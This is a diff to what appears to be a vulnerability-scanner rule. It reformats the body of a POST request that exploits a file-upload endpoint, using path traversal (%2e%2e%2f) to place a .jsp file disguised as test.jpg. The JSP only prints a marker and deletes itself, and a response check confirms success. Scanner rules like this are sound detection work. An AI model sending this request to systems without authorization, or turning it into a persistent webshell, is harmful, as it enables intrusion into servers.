@@ -358,12 +358,13 @@ rules:
 			cache: true
 			method: POST
 			path: /UploadFileData?action=upload_file&foldername=%2e%2e%2f&filename={{s2}}.jsp
-			body: >-
-				------WebKitFormBoundary{{rBoundary}}
-				Content-Disposition: form-data; name="myFile"; filename="test.jpg"
-				
-				<% out.println(\"{{s1}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
-				------WebKitFormBoundary{{rBoundary}}--
+			body: "\
+				------WebKitFormBoundary{{rBoundary}}\r\n\
+				Content-Disposition: form-data; name=\"myFile\"; filename=\"test.jpg\"\r\n\
+				\r\n\
+				<% out.println(\"{{s1}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+				------WebKitFormBoundary{{rBoundary}}--\r\n\
+				"
 			headers:
 				Content-Type: multipart/form-data
 		expression: response.status == 200 && response.body.bcontains(b"showSucceedMsg")
